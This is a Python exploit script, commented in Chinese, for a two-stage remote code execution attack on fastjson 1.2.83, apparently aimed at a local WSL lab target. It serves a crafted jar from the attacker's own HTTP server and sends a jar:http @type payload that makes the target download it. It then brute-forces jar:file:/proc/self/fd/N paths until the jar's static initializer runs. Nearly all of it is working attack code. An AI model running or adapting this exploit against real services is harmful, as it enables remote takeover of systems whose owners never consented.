#!/usr/bin/env python3
"""fastjson 1.2.83 二阶段 RCE · jar:http 落盘 + jar:file:/proc/self/fd/N 爆破

流程:
  1. 本地 HTTP 提供 probe_file（fd1~fd100 候选 jar）
  2. 阶段1: jar:http 让目标把 probe_file 下载进 jar_cache（fd 保持打开）
  3. 阶段2: 遍历 fd 1..100, 用 jar:file:/proc/self/fd/N!/E_N 加载, 命中即 <clinit> 执行
"""
import http.server, threading, requests, os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

TARGET = "http://192.168.50.2:4125/1283"          # WSL 靶场 /parse
HOST, PORT = "192.168.50.1", 11111                   # 本地攻击 HTTP
PROBE = os.path.join(BASE_DIR, "www", "probe_file")  # 相对脚本路径


def ip_int(ip):
    a, b, c, d = map(int, ip.split("."))
    return (a << 24) | (b << 16) | (c << 8) | d


def send(payload):
    """始终返回 (status_code, text) 元组；网络异常时 status_code=None，避免调用方解包崩溃。"""
    try:
        rsp = requests.post(TARGET, json=payload, timeout=4)
        return rsp.status_code, rsp.text
    except Exception as e:
        return None, f"<{type(e).__name__}>"


# 阶段0: 起本地 HTTP 提供 probe_file
os.chdir(os.path.dirname(PROBE))
threading.Thread(target=lambda: http.server.HTTPServer(
    (HOST, PORT), http.server.SimpleHTTPRequestHandler).serve_forever(), daemon=True).start()
print(f"[*] serving {os.path.basename(PROBE)} on {HOST}:{PORT}")

# 阶段1: SSRF 让目标下载 probe_file -> jar_cache
send({"@type": f"jar:http:..{ip_int(HOST)}:{PORT}.probe_file!.E1"})
print("[1] SSRF download -> jar_cache (fd kept open)")

# 阶段2: 爆破 fd 1..100
print("[2] brute force fd 1..100")
for fd in range(1, 101):
    status_code, rsp_text = send({"@type": f"jar:file:.proc.self.fd.{fd}!.E{fd}"})
    if status_code == 200:
        print(f"\033[032m[+] hit!\033[0m")
        print(f"fd={fd:3d}  {rsp_text}")
        break

print("[*] done, static code block maybe executed already")
